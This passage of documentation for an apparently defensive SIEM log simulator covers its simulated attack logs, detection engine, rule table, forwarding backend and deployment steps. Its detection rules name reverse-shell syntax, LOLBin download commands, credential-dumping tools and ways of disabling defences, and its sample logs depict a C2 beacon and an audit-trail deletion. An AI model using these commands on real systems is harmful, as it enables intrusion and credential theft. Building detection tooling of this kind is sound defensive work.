near-identical byte counts, and Cobalt Strike's default JA3 on the TLS handshake:

```
<156>Aug 13 14:23:02 zeek-sensor-01 zeek_conn: 1786623782.862000	Cj85uhmftumpi	10.32.159.147	54606	91.219.236.19	443	tcp	ssl	60.113000	284	1147	SF	T	F	0	ShADadFf	9	644	9	1507
<156>Aug 13 14:23:02 zeek-sensor-01 zeek_ssl: 1786623782.862000	Cj85uhmftumpi	10.32.159.147	54606	91.219.236.19	443	TLSv12	TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	beacon.malware-cdn.top	T	a0e9f5d64349fb13191bc781f81f42e1	ae4edc6faf64d08308082ad26be60767
```

**AWS CloudTrail** — a JSON record, re-emitted by a connector. AWS writes these to
S3 or EventBridge and never to a socket, which is why the source is badged `api`.
`userIdentity` plus `eventName` is the whole detection surface — `DeleteTrail` on
the audit trail itself is an attacker clearing the tape:

```
<179>Aug 13 14:22:22 aws-connector-01 aws_cloudtrail: {"eventVersion":"1.09","userIdentity":{"type":"IAMUser","principalId":"AIDA3679D50BFC0C10E66","arn":"arn:aws:iam::210987654321:user/ci-runner","accountId":"210987654321","userName":"ci-runner"},"eventTime":"2026-08-13T12:22:22Z","eventSource":"cloudtrail.amazonaws.com","eventName":"DeleteTrail","awsRegion":"us-east-1","sourceIPAddress":"193.36.119.7","userAgent":"aws-cli/2.15.30 Python/3.11.6","requestParameters":{"name":"arn:aws:cloudtrail:us-east-1:210987654321:trail/org-audit-trail"},"responseElements":null,"eventID":"c0553b75-715d-45af-a8d6-699083169b91","eventType":"AwsApiCall","readOnly":false,"managementEvent":true,"recipientAccountId":"210987654321"}
```

**Okta System Log** — a JSON record polled from `GET /api/v1/logs`. The
`client.geographicalContext` block is what makes impossible travel detectable at
all, and `outcome.reason` distinguishes a rejected MFA push from an expired one:

```
<180>Aug 13 14:22:28 okta-connector-01 okta_systemlog: {"uuid":"4059a24f-fdba-453a-a664-01414a20a1b5","published":"2026-08-13T12:22:28.851Z","eventType":"user.authentication.auth_via_mfa","version":"0","severity":"WARN","displayMessage":"Authentication of user via MFA","actor":{"id":"00u3e4f4h4a","type":"User","alternateId":"mchen@corp.local","displayName":"mchen"},"client":{"userAgent":{"rawUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","os":"Windows 10","browser":"CHROME"},"zone":"null","device":"Computer","ipAddress":"193.36.119.7","geographicalContext":{"city":"Shenzhen","country":"China","geolocation":{"lat":22.54,"lon":114.06}}},"outcome":{"result":"FAILURE","reason":"FAILED_PUSH_VERIFY_REJECTED"},"authenticationContext":{"authenticationProvider":"OKTA_AUTHENTICATION_PROVIDER","credentialType":"OTP"},"securityContext":{"asNumber":4134,"isProxy":true},"target":null}
```

Click any appliance event in the live stream to open the drawer and see its full
raw wire line alongside the parsed fields.

---

## 7. The Jedi SIEM engine

`Jedi.ingest(event)`:

1. Updates counters — total events, per-severity, per-source, timeline buckets.
2. Adds the event to a capped recent-events ring (default 400).
3. Runs every detection rule; each hit becomes an **alert** (capped at 200).

**Rolling metrics**

- **EPS** — events in a trailing 3 s window.
- **Timeline** — per-second buckets of events and alerts (last ~120 s), drawn on
  the canvas chart.
- **Threat level** — sum of the last 2 minutes of alert severities
  (critical = 4, high = 3, medium = 2, low = 1) mapped to
  `GUARDED → ELEVATED → HIGH → SEVERE → CRITICAL`.

**Correlator** — a small stateful helper shared by the rules:

| Primitive | Use |
|-----------|-----|
| `window(ns, key, ms, now)` | Sliding array of timestamps within `ms` |
| `windowSet(ns, key, ms, now, value)` | Sliding set of distinct values (e.g. ports, users) |
| `cooldown(ns, key, ms, now)` | True at most once per `ms` — throttles repeat alerts |

---

## 8. Detection rules

Each rule returns `null` (no match) or an alert `{severity, tactic, technique,
message, srcIp, host, evidence}`. Correlating rules use the primitives above.

| Rule id | Name | Trigger | ATT&CK |
|---------|------|---------|--------|
| `ssh-bruteforce` | SSH Brute-Force | ≥ 8 failed `sshd` logins / IP / 60 s | T1110 |
| `brute-success` | Login After Brute Force | `Accepted password` after a failure burst | T1078 |
| `port-scan` | Horizontal Port Scan | ≥ 15 distinct denied dst ports / IP / 30 s | T1046 |
| `sql-injection` | SQL Injection | SQLi regex in an HTTP request | T1190 |
| `c2-beacon` | C2 / Known-Bad Destination | internal host → threat-intel IP | T1071 |
| `data-exfil` | Large Outbound Transfer | outbound flow > 100 MB | T1048 |
| `dns-tunneling` | DNS Tunneling | long DNS label / known-bad domain (`dns` + `bind` sources) | T1071.004 |
| `priv-esc` | Privilege Escalation | `sudo … USER=root` / Win 4672 | T1068 |
| `ids-malware` | IDS Malware Signature | Suricata/ET trojan/exploit | T1204 |
| `radius-brute` | RADIUS / 802.1X Brute Force | ≥ 6 Cisco ISE `5400` failures / MAC / 60 s | T1110 |
| `auditd-rootshell` | Root Shell From Unprivileged Login | auditd `SYSCALL`, `auid` set & ≠0, `uid=0`, `key="rootshell"` | T1548 |
| `appliance-threat` | Appliance IPS / WAF Signature | any `threatSig` present | T1190 (by signature) |
| `web-exploit` | Web Application Attack | Log4Shell / XSS / traversal / web shell / scanner UA / `169.254.169.254` metadata SSRF | T1190·T1059·T1083·T1505.003·T1595·T1552.005 |
| `windows-threat` | Windows Security Event | 4625 brute/spray, 4768 no-preauth RC4, 4769 RC4 or blank domain, 4662 repl, 4732/4720, 1102, 4624 PtH, 7045 PsExec (`windows` + `snare` sources) | T1110·T1558.001·T1558.003·T1558.004·T1003.006·T1136·T1070.001·T1550.002·T1021.002 |
| `cred-dumping` | Credential Dumping (LSASS) | Sysmon **10** into `lsass.exe` with `0x1010/0x1410/0x1438/0x143a`, or `comsvcs MiniDump` / procdump / mimikatz on a command line | T1003.001 |
| `persistence-mech` | Persistence Mechanism Created | `CurrentVersion\Run` write, `schtasks /create` or 4698, `sc create` or 7045 (PsExec-style names excluded) | T1547.001·T1053.005·T1543.003 |
| `lolbin-abuse` | LOLBin Download / Proxy Execution | `certutil -urlcache/-decode`, `bitsadmin /transfer`, `mshta http…`, `regsvr32 /i:http` | T1105·T1218 |
| `security-tooling-disabled` | Security Tooling Disabled | `DisableRealtimeMonitoring`, `-ExclusionPath`, AMSI patch markers, `net stop windefend` | T1562.001 |
| `ad-recon` | Active Directory Enumeration | SharpHound / BloodHound / AdFind / `Get-Domain*` on a command line, or ≥ 10 × 4662 directory reads / account / 60 s | T1087.002 |
| `cloud-threat` | Cloud Control-Plane Abuse | CloudTrail `eventName`: trail/detector deletion, IAM credential creation, admin policy attach, public bucket, root console login | T1562.008·T1098.001·T1098.003·T1530·T1078.004 |
| `identity-threat` | Identity Provider Threat | Okta `user.session.start` successes from ≥ 2 countries / hour, or an MFA-factor / policy / privilege change | T1078.004·T1098.003 |
| `mfa-fatigue` | MFA Push Bombing | ≥ 6 rejected Okta push prompts / user / 5 min, then a **critical** follow-up if one is finally approved | T1621 |
| `reverse-shell` | Reverse Shell | `/dev/tcp/`, `nc -e`, `bash -i >&` | T1059 |
| `susp-powershell` | Suspicious PowerShell | `-enc` / `FromBase64String` / hidden window | T1059.001 |
| `cryptomining` | Cryptomining | `stratum+tcp` / known pool | T1496 |
| `ransomware` | Ransomware Behavior | shadow-copy deletion / mass `.locked` | T1486 |
| `dos-flood` | DoS / Flood | flood markers, or ≥ 40 blocks to one host / 5 s | T1498 |
| `phishing` | Phishing Email | SPF/DKIM/DMARC fail + risky attachment | T1566 |

---

## 9. File replay

Load a `.log` / `.txt` / `.csv` / `.json` file in **File replay**, tick **use as
source** and (optionally) **loop**. Each line is parsed best-effort into an event:

- A leading `<PRI>` sets facility/severity; the rest becomes the message.
- Host is extracted from an RFC 3164 or ISO-8601 timestamp prefix if present.
- The first two IPs found populate `srcIp` / `dstIp`, so IP-based rules still fire.
- The original line is preserved verbatim as `raw`.

While active, file lines replace the synthetic baseline and are emitted at the
configured EPS, looping when they reach the end (if **loop** is on). File events
are also forwarded and count toward the volume cap like any other event.

---

## 10. Live forwarding & the backend API

A browser cannot open raw UDP/TCP sockets, so **forwarding requires `server.js`.**
When **Forward live** is on, the browser batches raw lines and POSTs them every
500 ms; the backend emits them to the collector.

### Endpoints

| Method & path | Body | Response | Purpose |
|---------------|------|----------|---------|
| `POST /forward` | `{ip, port, proto, lines[]}` | `{ok, sent, total, error}` | Relay lines as UDP (fire-and-forget) or TCP (newline-framed, RFC 6587) |
| `POST /test` | `{ip, port, proto}` | `{ok, reachable, warn, ms, code, message}` | Reachability probe (see §11) |
| `GET /status` | — | `{ok, backend, forwarded}` | Health / counter |
| `GET /*` | — | file | Static host for the app |

The backend logs every relay to its console:
`→ forwarded N line(s) to <ip>:<port>/udp (UDP: no delivery confirmation)`.

**UDP is fire-and-forget** — a rising "sent" count means packets left the host,
not that the SIEM received them. Use TCP or the Test button to confirm delivery.

---

## 11. Connectivity test

The **Test** button probes the configured `IP:port` via `POST /test`.

| Protocol | Behaviour |
|----------|-----------|
| **TCP** | Real connect. `✓ reachable and port open`, `✗ Connection refused` (ECONNREFUSED), or `✗ timed out` (firewall). Definitive. |
| **UDP** | Connected-UDP probe. `✗ ICMP port-unreachable` if nothing is listening (Linux). An open/filtered port is inconclusive (`◐`) because UDP has no ack. |

Result colouring: green = reachable, amber = inconclusive (UDP open/filtered),
red = failed (with the exact error code).

---

## 12. Configuration reference

All controls live in the header and the **Source & delivery configuration** bar.

| Control | Effect |
|---------|--------|
| Start / Stop Ingestion | Run/pause baseline generation |
| Rate slider | 0–60 baseline events per second |
| RFC 3164 / RFC 5424 | Wire format for generic sources |
| Reset | Clear all state, counters, stream, and alerts |
| Log collector `IP : port` + `UDP/TCP` | Forwarding/test destination |
| **Test** | Probe reachability of that destination |
| **Forward live** | Relay generated logs as real syslog (needs backend) |
| Volume limit — Unlimited / Limit to N | Total-event cap; auto-stops at N |
| File replay — Choose file / loop / use as source | Replay an uploaded log file |
| Stream filter / pause | Filter the live stream; freeze it |

`PORT` env var overrides the backend's listen port (default **8099**).

---

## 13. Deployment

The app is a static site plus a zero-dependency Node backend. **Requirement on the
target: Node.js** (no `npm install`).

### Prerequisites

- **Node.js 14 or newer** (any current LTS) — provides the `node` runtime for the
  backend. Verify with `node --version`. Install it from your OS package manager
  or from <https://nodejs.org>.
- **git** — only needed if you clone the repo (you can download an archive
  instead — see below).
- **Nothing else.** There is no `package.json` and no `npm install` — the backend
  uses only Node's built-in `http`, `dgram`, `net`, `fs`, and `path` modules.

### Getting the code onto a new machine

**Option A — clone with git:**

```bash
git clone https://github.com/alfredonacino/APEX-Jedi-Syslogger.git
cd APEX-Jedi-Syslogger
```

**Option B — download an archive (no git required):**

```bash
# tarball of the main branch
curl -L -o apex.tar.gz \
  "https://github.com/alfredonacino/APEX-Jedi-Syslogger/archive/refs/heads/main.tar.gz"
tar xzf apex.tar.gz
cd APEX-Jedi-Syslogger-main
```

Or from the GitHub web UI: **Code ▾ → Download ZIP**, then
unpack it. Either way you end up with `index.html`, `server.js`, and the `js/`,
`css/`, `samples/` folders — start it with `node server.js` (see below).

### Copy the files to a remote host

If you already have the project locally and want to push it to a server:

```bash
rsync -av --exclude '.git' --exclude 'node_modules' \
  ./ alfreddgreat@172.26.250.20:/home/alfreddgreat/APEX_JediSyslogger/
```

### Run it

```bash
cd /home/alfreddgreat/APEX_JediSyslogger
node server.js                                    # foreground, port 8099
PORT=80 node server.js                            # privileged port (needs root/setcap)
setsid node server.js </dev/null >apex.log 2>&1 & # detached
```

Then browse to `http://172.26.250.20:8099`.

> **Starting it over SSH: use `setsid`, not `nohup`.** A plain
> `nohup node server.js > apex.log 2>&1 &` leaves the server's stdout attached to
> the SSH session, so the channel never closes and the command appears to hang.
> `setsid` with stdin redirected from `/dev/null` fully detaches it.

**Updating a running deployment** needs only the `rsync` above — `server.js` serves
the static files from disk on each request, so a change to `js/`, `css/`, or the
docs is live immediately with **no restart and no downtime**. Restart only when
`server.js` itself changes.

### Run as a systemd service (recommended)

`/etc/systemd/system/apex-jedisyslogger.service`:

```ini
[Unit]
Description=APEX JediSyslogger SIEM log simulator
After=network.target

[Service]
Type=simple
User=alfreddgreat
WorkingDirectory=/home/alfreddgreat/APEX_JediSyslogger
Environment=PORT=8099
ExecStart=/usr/bin/node server.js
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now apex-jedisyslogger
sudo systemctl status apex-jedisyslogger
```

### Firewall

Open the dashboard port to your clients, and — if forwarding — allow egress to
the collector:

```bash
sudo ufw allow 8099/tcp             # dashboard
sudo ufw allow out 514/udp          # syslog egress (adjust to your collector)
```

---

## 14. Extending the app

- **New generic log source** — add a builder to `BASELINE` in `js/syslogger.js`
  and a `SOURCE_META` colour/label in `js/ui.js`.
- **New appliance format** — add a formatter to `VENDOR_FORMATTERS` in
  `js/data.js` and a generator to `APPLIANCE` in `js/syslogger.js`, plus a
  `SOURCE_META` entry in `js/ui.js`.
- **New attack scenario** — add an entry to `MORE_ATTACKS` (or `SCENARIOS`) in
  `js/syslogger.js`; set `threatSig` or emit content a rule matches.
- **New detection rule** — push a rule object into `makeRules()` in `js/jedi.js`.
  Use `ctx.window()` / `ctx.windowSet()` / `ctx.cooldown()` for correlation.

Four conventions worth keeping:

1. **Declare a non-native `transport`.** If the product can't reach a collector
   without an agent or an API connector, set `transport: 'agent'` / `'api'` on the
   `APPLIANCE` entry. Default is `'native'`. The UI badges anything non-native.
   Silently presenting an API-only product as a syslog appliance teaches a false
   fact about log ingestion, which defeats the point of the tool.
2. **Reuse a rule instead of cloning it.** If a new source carries telemetry an
   existing rule already reads, widen that rule's `srcType` gate. `snare` is
   Windows Event Log over an agent, so it feeds `windows-threat`; `bind` feeds
   `dns-tunneling`; `zeek`'s beacon flows need no gate at all and fall straight
   into `c2-beacon`. A near-duplicate rule means two alerts for one event.
3. **One burst, one alert.** Rules have no global cooldown, so a burst where every
   line carries `threatSig` raises an alert per line. Either tag only the final
   event, or let a stateful rule correlate the burst (`radius-brute`).
4. **Update the counts** in `README.md`, this file, and `CLAUDE.md`.

Every scenario should be wired to at least one rule — the headless harness pattern
(load `js/*` under a stubbed `window`, inject each scenario, assert alerts fire) is
the quickest way to verify coverage. Note that `Jedi.ingest()` wraps each
`rule.run()` in `try/catch` and discards the error, so a **broken rule fails
silently** — a harness that asserts on alerts is the only thing that catches it.

---

## 15. Troubleshooting

| Symptom | Cause / fix |
|---------|-------------|
| "Forward live" green but SIEM sees nothing | UDP is fire-and-forget. Click **Test** or switch to TCP; run `tcpdump -n port 514` on the collector. |
| Test shows `Connection refused` | Host reachable, nothing listening on that port/proto — enable the SIEM's syslog input. |
| Test shows `timed out` | Firewall/routing dropping traffic between the hosts. |
| Forwarding foot says "backend not running" | You opened the app statically (python/`file://`). Serve it with `node server.js`. |
| Port 8099 in use | `PORT=9000 node server.js`. |
| Nothing happens on Start | Rate slider at 0, or a volume cap already reached — check the volume foot. |

---

Created By: **Alfredo Nacino** · [www.alfredonacino.com](https://www.alfredonacino.com) · alfredo@nacino.net
